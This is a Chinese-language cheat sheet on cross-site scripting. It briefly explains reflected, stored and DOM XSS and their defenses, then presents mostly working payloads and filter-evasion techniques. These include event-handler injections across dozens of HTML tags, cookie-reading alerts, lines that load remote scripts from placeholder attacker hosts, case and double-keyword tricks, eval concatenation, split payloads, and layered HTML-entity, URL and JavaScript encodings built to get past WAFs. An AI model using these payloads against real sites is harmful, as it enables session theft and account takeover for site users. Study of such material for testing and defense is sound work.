# XSS绕过总结

## 分类

```php
反射性XSS
存储型XSS
DOM型XSS
```

### 反射型xss

1. 攻击方式

   ```php
   攻击者通过电子邮件等方式将包含XSS代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接受该目标用户的请求并进行处理，然后服务器把带有XSS的代码发送给目标用户的浏览器，浏览器解析这段带有XSS代码的恶意脚本后，就会触发XSS漏洞。
   ```

   

2. 攻击步骤

   ```php+HTML
   1.攻击者构造出特殊的URL，其中包含恶意代码.
   2.用户打开有恶意代码的URL时，网站服务器端将恶意代码从URL取出，拼接在HTML返回给浏览器.
   3.用户浏览器接收到响应后解析执行，混在其中的恶意代码也会被执行。
   4.恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户行为，调用目标网站接口执行攻击者指定的操作。
   ```

3. 防御反射型攻击

   ```php
   1.对输入检查
   对请求参数进行检查，一旦发现可疑的特殊字符就拒绝请求。需要注意的是用户可以绕过浏览器的检查，直接通过Postman等工具进行请求，所以这个检查最好前后端都做。
   
   2.对输出进行转义再显示
   通过上面的介绍可以看出，反射型XSS攻击要进行攻击的话需要在前端页面进行显示。所以在输出数据之前对潜在的威胁的字符进行编码、转义也是防御XSS攻击十分有效的措施。
   ```

### 存储型xss

1. 攻击方式

   * 攻击者在发帖、留言、评论的过程中，将恶意脚本连同正常信息一起注入到发布内容中。随着发布内容被服务器存储下来，恶意脚本也将永久的存放到服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本就会在用户的浏览器中得到执行。

2. 攻击步骤

   ```php
   1.攻击者将恶意代码提交到目标网站的数据库中。
   2.用户打开目标网站时，网站服务端将恶意代码从数据库中取出，拼接在HTML中返回给浏览器。
   3.用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。
   4.恶意代码窃取用户数据并发送到攻击者的网站，或冒充用户行为，凋用目标网站接口执行攻击者指定的操作.
   这种攻击常见于带有用户保存数据的网站功能，如论坛发帖，商品评论，用户私信等。
   ```

3. 预防存储型XSS攻击

   ```php
   预防存储型XSS攻击也是从输入和输出两个方面来考虑。
   1.服务器接收到数据，在存储到数据库之前，进行转义和过滤危险字符;
   2.前端接收到服务器传递过来的数据，在展示到页面前，先进行转义/过滤;
   不论是反射型攻击还是存储型，攻击者总需要找到两个要点，即“输入点”与"输出点"，也只有这两者都满足，XSS攻击才会生效。“输入点”用于向 web页面注入所需的攻击代码，而“输出点”就是攻击代码被执行的地方。
   ```

### DOM型xss

1. 攻击方式

   ```php
   用户请求一个经过专门设计的URL，它由攻击者提供，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM对象就会处理XSS代码，导致存在XSS漏洞。
   /*DOM(Document object model)，使用DOM能够使程序和脚本能够动态访问和更新文档的内容、结构和样式。DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象的一种漏洞。DOM型XSS是基于js上的，不需要与服务器进行交互。*/
   ```

2. 攻击步骤

   ```php
   1.攻击者构造出特殊数据，其中包含恶意代码。
   2.用户浏览器执行了恶意代码
   3.恶意窃取用户数据并发送到攻击者的网站，或冒充用户行为，调用目标网站接口执行攻击者指定的操作.
   /*DOM型XSS攻击中，取出和执行恶意代码由浏览器端完成，属于前端javascript自身的安全漏洞.*/
   ```

### 其他防范策略

1. HTTP-only Cookie:禁止JavaScript读取某些敏感Cookie，攻击者完成XSS注入后也无法窃取此Cookie属性：防止脚本冒充用户提交危险操作
2. 在服务端使用HTTP的Content-Security-Policy头部来指定策略，或者在前端设置meta标答。例如只允许加载同域下的资源
3. 应对XSS攻击的主要手段还是编码与过滤两种，编码用于将特殊的符号 "<、>、&、'、""进行**html转义**，而过滤则是阻止特定的标记、属性、事件。

## 攻击荷载

### script标签

<script> 标签用于定义客户端脚本

```html
<script>alert("xss")</script>             
<script>alert(/xss/)</script>                             
<script>alert(document.cookie)</script>   
<script src=http://xxx.com/xss.js></script> 
```

### svg标签

```html
<svg> 标签用来在HTML页面中直接嵌入SVG 文件的代码。 // 等价于 >
<svg onload="alert("xss")">
<svg onload="alert("xss")"//
```

### img标签

```html
<img> 标签定义 HTML 页面中的图像
<img src=1 onerror=alert("xss")>
<img src=1 onerror=alert(document.cookie)>
<img src=1 onerror=eval("alert('xss')")>
<img src=javascript:alert("xss")>
<img src=javascript:alert(String.formCharCode(88,83,83))>
<img src=1 onmouseover=alert('xss')>
```

### body标签

```html
<body> 标签定义文档的主体。
<body onload=alert('xss')>
<body onpageshow=alert('xss')>
```

### video标签

```html
<video> 标签定义视频，比如电影片段或其他视频流。
<video><source onerror=alert(1)>
<video><source onerror="alert('xss');"></video>
<video controls onmouseover="alert('xss');"></video>
<video controls onfocus="alert('xss');" autofocus=""></video>
<video controls onclick="alert('xss');"></video>
```

### style标签

```html
<style> 标签定义 HTML 文档的样式信息。
<style onload=alert(1)></style>
```

### input标签

```html
<input>标签规定了用户可以在其中输入数据的输入字段。点击输入框触发
<input onfocus=alert(1);>
<input value="" onclick=alert('xss') type="text">
<input name="name" value=""onmouseover=prompt('xss') bad="">
<input name="name" value=""><script>alert('xss')</script>
<input onblur=alert(1) autofocus><input autofocus>
<input onfocus="alert(1);" autofocus>
```

### details 标签

```html
<details> 标签通过提供用户开启关闭的交互式控件，规定了用户可见的或者隐藏的需求的补充细节。
<details ontoggle=alert(1);>
<details open ontoggle=alert(1);>
```

### select 标签

```html
<select> 标签用来创建下拉列表。
<select onfocus=alert(1)></select>
<select onfocus=alert(1) autofocus>
```

### iframe 标签

```php
<iframe> 标签会创建包含另外一个文档的内联框架
    <iframe onload=alert(1);></iframe>
```

### audio 标签

```html
<audio> 标签定义声音，比如音乐或其他音频流。
<audio src=x  onerror=alert(1);>
```

### textarea 标签

```html
`<textarea>` 标签定义一个多行的文本输入控件。
<textarea onfocus=alert(1); autofocus>
```

### marquee 标签

```html
<marquee onstart=alert(1)></marquee> //Chrome不行，火狐和IE都可以
```

### isindex 标签

```html
<isindex type=image src=1 onerror=alert(1)>//仅限于IE 
```

### link 标签

`<link>` 标签定义文档与外部资源的关系。在无CSP的情况下才可以使用：

```html
<link rel=import href="http://47.xxx.xxx.72/evil.js">
```

### a 标签

```html
<a href="javascript:alert(1);">xss</a>
<a href="x" onclick=eval("alert('xss');")>xss</a>
<a href="x" onmouseover="alert('xss');">xss</a>
<a href="x" onmouseout="alert('xss');">xss</a>
```

### form标签

```html
<form action="Javascript:alert(1)"><input type=submit>
<form method="x" action="x" onmouseover="alert('xss');"><input type=submit></form>
```

### button标签

```php
<button onclick=alert(1)>
<button onfocus="alert('xss');" autofocus="">xss</button>
<button onclick="alert('xss');">xss</button>
<button onmouseover="alert('xss');">xss</button>
<button onmouseout="alert('xss');">xss</button>
<button onmouseup="alert('xss');">xss</button>
<button onmousedown="alert('xss');"></button>
```

### div标签

```php
这个需要借助url编码来实现绕过
原代码：
<div onmouseover='alert(1)'>DIV</div>
经过url编码：
<div onmouseover%3d'alert%26lpar%3b1%26rpar%3b'>DIV<%2fdiv>
```

### object标签

```php
这个需要借助 data 伪协议和 base64 编码来实现绕过

<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4="></object>
```

### p标签

```php
<p onclick="alert('xss');">xss</p>
<p onmouseover="alert('xss');">xss</p>
<p onmouseout="alert('xss');">xss</p>
<p onmouseup="alert('xss');">xss</p>
```

## 绕过思路

### 过滤 危险字符& < > " ' /

#### 绕过空格过滤

当空格被过滤了时，我们可以用 `/` 来代替空格：

```html
<img/src="x"/onerror=alert(1);>
```

#### 空格回车Tab绕过

```php
主要和正则对抗
空格：<img src= "javascript:alert(9527);" >
TAB：< img src= "javasc :ript:alert(9528);" >
回车：< img src= "jav
ascript:
alert('xss');" >
```

#### 绕过引号过滤

如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号：

```html
<img src=x onerror=alert(`xss`);>
```

#### 绕过括号过滤

当括号被过滤的时候可以使用throw来绕过。throw 语句用于当错误发生时抛出一个错误。

```html
<img src=x onerror="javascript:window.onerror=alert;throw 1">
<a onmouseover="javascript:window.onerror=alert;throw 1>
```

#### 绕过关键字过滤

#### 大小写绕过

```html
<sCRiPt>alert(1);</sCrIpT>
<ImG sRc=x onerRor=alert(1);>
```

#### 双写绕过

有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过

```html
<scrscriptipt>alert(1);</scrscriptipt>
<imimgg srsrcc=x onerror=alert(1);>
```

#### 字符串拼接绕过

利用eval()函数

与PHP的eval()函数相同，JavaScript的eval()函数也可以计算 JavaScript 字符串，并把它作为脚本代码来执行。

```html
<img src="x" onerror="a='aler';b='t';c='(1)';eval(a+b+c)">
<img src="x" onerror="a=`aler`;b=`t`;c='(`xss`);';eval(a+b+c)">
<!--在js中，我们可以用反引号代替单双引号-->
```

利用top

```html
<script>top["al"+"ert"](`xss`);</script>
<script>top["al"+"ert"]("xss");</script>
```

#### 拆分法

当 Web 应用程序对目标用户的输入长度进行了限制时，这时无法注入较长的[xss攻击](https://so.csdn.net/so/search?q=xss攻击&spm=1001.2101.3001.7020)向量，但是特定情况下，这种限制可以通过拆分法注入的方式进行绕过

```php
<script>a='document.write("'</script>

<script>a=a+'<script src=ht'</script>

<script>a=a+'tp://note163.com/xs'</script>

<script>a=a+'s.js></script>")'</script>

<script>eval(a)</script>
/*document.write("<script src = http://note163.com/xss.js></script>")*/
```

#### 上传文件构造xss

上传普通文件更改文件名为xss语句   <script>alert(443)</script>.gif/png

#### 编码绕过

**浏览器**整个解析顺序为3个环节：HTML实体解码 —>URL解码 —>JS解码（只支持Unicode）

##### HTML 实体编码

 我们可以将DOM节点中的内容转化为HTML实体，因为解析HTML之后建立起节点，然后会对DOM节点里面的HTML实体进行解析。HTML 编码主要分为10进制和16进制，格式为以 `&#` 开头以分号 `;` 结尾（也可以不带分号）。

```html
<!--
<a href=javascript:alert("xss")>test\</a>
-->
<!--十进制-->
<a href=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#120;&#115;&#115;&#34;&#41;>test</a>
 
<!--十六进制-->
<a href=&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x22;&#x78;&#x73;&#x73;&#x22;&#x29;>test</a>
 
<!--也可以不带分号-->
<a href=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x22&#x78&#x73&#x73&#x22&#x29>test</a>

<!--<img src=x onerror=alert("xss")>-->
<!--十进制-->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#120;&#115;&#115;&#34;&#41;>
 
<!--十六进制-->
<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x22;&#x78;&#x73;&#x73;&#x22;&#x29;>
 
<!--也可以不带分号-->
<img src=x onerror=&#x61&#x6C&#x65&#x72&#x74&#x28&#x22&#x78&#x73&#x73&#x22&#x29>
```

 HTML字符实体，并不是说任何地方都可以使用实体编码，只有处于 “数据状态中的字符引用”、“属性值状态中的字符引用” 和 “RCDATA状态中的字符引用” 这三种状态中的HTML字符实体将会从 `&#…` 形式解码，转化成对应的解码字符并被放入数据缓冲区中。

 一个HTML解析器作为一个状态机，它从输入流中获取字符并按照转换规则转换到另一种状态。在解析过程中，任何时候它只要遇到一个 < 符号（后面没有跟 /符号）就会进入 **标签开始状态**(Tag open state) ，然后转变到 **标签名状态**(Tag name state) 、 **前属性名状态**(before attribute name state) ......最后进入 **数据状态**(Data state) 并释放当前标签的token。当解析器处于**数据状态**(Data state) 时，它会继续解析，每当发现一个完整的标签，就会释放出一个token。

 简单的说就是，浏览器对HTML解码之后就开始解析HTML文档，将众多标签转化为内容树中的DOM节点，此时识别标签的时候，HTML解析器是无法识别那些被实体编码的内容的，只有建立起DOM树，才能对每个节点的内容进行识别，如果出现实体编码，则会进行实体解码，只要是DOM节点里属性的值，都可以被HTML编码和解析。

**数据状态中的字符引用：**数据状态就是解析一个标签内里面的内容，如 `<div>...</div>` 中的内容，当浏览器解析完 `<div>` 标签之后如果发现标签内还含有实体字符的话，就会有一个实体编码解析了

**属性值状态中的字符引用：**属性值状态中的字符引用就好理解了，就是src，herf这样的属性值中的HTML实体，他也是会先进行HTML解码的。

**RCDATA状态中的字符引用**：然后再来看一下什么是RCDATA转态，这里需要我们先了解一下HTML中有五类元素：

- 空元素(Void elements)，如` <area>`、`<br>`、`<base>` 等等。空元素不能容纳任何内容，因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间。
- 原始文本元素(Raw text elements)，有 `<script> `和 `<style>`。原始文本元素可以容纳文本。
- RCDATA元素(RCDATA elements)，有 `<textarea>` 和 `<title>`。RCDATA元素可以容纳文本和字符引用。
- 外部元素(Foreign elements)，例如MathML命名空间或者SVG命名空间的元素。外部元素可以容纳文本、字符引用、CDATA段、其他元素和注释。
- 基本元素(Normal elements)，即除了以上4种元素以外的元素。基本元素可以容纳文本、字符引用、其他元素和注释。

 注意到RCDATA元素中有 `<textarea> `和 `<title> `两个属性并且有字符引用，也就是当实体字符出现在这两个标签里面的时候，实体字符会被识别并进行HTML编码解析。这里要再提醒一次，在解析这些字符引用的过程中不会进入“标签开始状态”，所以就不会建立新的标签，所以HTML编码的XSS语句触发不了XSS。

 HTML的五类元素中，像 `<script>`、`<style>` 这样的原始文本元素在这个标签内容纳的是文本，所以浏览器在解析到这个标签后，里面内容中的HTML编码并不会被认为是HTML实体引用，所以并不会被解码为相应的字符,不会触发语句原有的结果。**但是当在前面加上 `<svg>` ，即可成功弹窗**。

##### URL编码

我们可以并将src或href属性中的内容进行URL编码，当HTML解析器对src或href中的字符完成HTML解码后，接下来URL解析器会对src或href中的值进行URL解码。

```html
<a href=javascript:alert("xss")>test</a>
<a href=javascript:%61%6c%65%72%74%28%22%78%73%73%22%29>test</a>

<iframe src=javascript:alert("xss")></iframe>
<iframe src="javascript:%61%6c%65%72%74%28%22%78%73%73%22%29"></iframe>

<!--伪协议头 javascript: 是不能进行编码的。这里就有一个URL解析过程中的一个细节了，
即不能对协议类型进行任何的编码操作，否则URL解析器会认为它无类型，
就会导致DOM节点中被编码的“javascript”没有被解码，当然不会被URL解析器识别了。
如：
http://www.baidu.com 可以被URL编码为 http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d，
但是不能把协议也进URL编码：%68%74%74%70%3a%2f%2f%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d

但是伪协议头 javascript: 可以进行HTML编码。
-->
```

##### Javascript 编码

我们可以将DOM节点中的内容转化为 Javascript 编码。当HTML解析产生DOM节点后，会根据DOM节点来做接下来的解析工作，比如在处理诸如 `<script>`、`<style>` 这样的标签时，解析器会自动切换到JavaScript解析模式，而 src、 href 后边加入的 javascript 伪URL，也会进入 JavaScript 的解析模式。Javascript 中可以识别的编码类型有：

- Unicode 编码
- 八进制编码
- 十六进制编码

Unicode编码的比较广泛，而八进制和十六进制只有在DOM环境或eval()等函数中才可以用。

##### Unicode 编码

```html
<script>alert("xss")</script>
<script>\u0061\u006C\u0065\u0072\u0074("xss")</script>
<script>\u0061\u006C\u0065\u0072\u0074("\u0078\u0073\u0073")</script>

<a href=javascript:alert("xss")>test</a>
<a href=javascript:\u0061\u006C\u0065\u0072\u0074("xss")>test</a>
<a href=javascript:\u0061\u006C\u0065\u0072\u0074("\u0078\u0073\u0073")>test</a>
<!--不能对伪协议头 javascript: 进行 Javascript 编码。并且像圆括号、双引号、单引号这样的符号我们也不能进 Javascript 编码，但是能进行HTML编码。-->
```

##### **在DOM环境中的JavaScript编码**

```html
对于八进制编码和十六进制编码，与 Unicode 编码还是有区别，要想让他们能够执行我们要将他们放在DOM环境中
<script>alert("xss")</script>
<script>\141\154\145\162\164("xss")</script>
<a href=javascript:alert("xss")>test</a>
<a href=javascript:\x61\x6c\x65\x72\x74("xss")>test</a>

<!--如果过滤了 <、>、'、"、&、% 等等这些字符的话，我们便可以用JavaScript编码的方法将XSS语句全部编码-->
即 <iframe src=javascript:alert('xss')></iframe> 的以下编码都可以弹窗：
<!--Unicode编码-->
\u003C\u0069\u0066\u0072\u0061\u006D\u0065\u0020\u0073\u0072\u0063\u003D\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003A\u0061\u006C\u0065\u0072\u0074\u0028\u0027\u0078\u0073\u0073\u0027\u0029\u003E\u003C\u002F\u0069\u0066\u0072\u0061\u006D\u0065\u003E
<!--八进制编码-->
\74\151\146\162\141\155\145\40\163\162\143\75\152\141\166\141\163\143\162\151\160\164\72\141\154\145\162\164\50\47\170\163\163\47\51\76\74\57\151\146\162\141\155\145\76
<!--十六进制编码-->
\x3c\x69\x66\x72\x61\x6d\x65\x20\x73\x72\x63\x3d\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29\x3e\x3c\x2f\x69\x66\x72\x61\x6d\x65\x3e

```

```html
另一种弹窗的方法
<script>alert("xss")</script>
<script>eval("\141\154\145\162\164\50\42\170\163\163\42\51")</script>

<a href=javascript:alert("xss")>test</a>
<a href=javascript:eval("\x61\x6c\x65\x72\x74\x28\x22\x78\x73\x73\x22\x29")>test</a>

<img src=x onerror=alert("xss")>
<img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')>

```

##### 混合编码

```html
<a href=javascript:alert("xss")>test</a>
首先对“alert”进行JavaScript Unicode编码：
<a href=javascript:\u0061\u006C\u0065\u0072\u0074("xss")>test</a>
然后再对 \u0061\u006c\u0065\u0072\u0074 进行URL编码：
<a href=javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34("xss")>test</a>
最后对标签中的 javascript:%5c%75...%37%34("xss") 整体进行HTML编码即可：
 <svg><a href=&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x33;&#x31;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x33;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x33;&#x35;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x37;&#x25;&#x33;&#x32;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x37;&#x25;&#x33;&#x34;&#x28;&#x22;&#x78;&#x73;&#x73;&#x22;&#x29;>test</a>
```

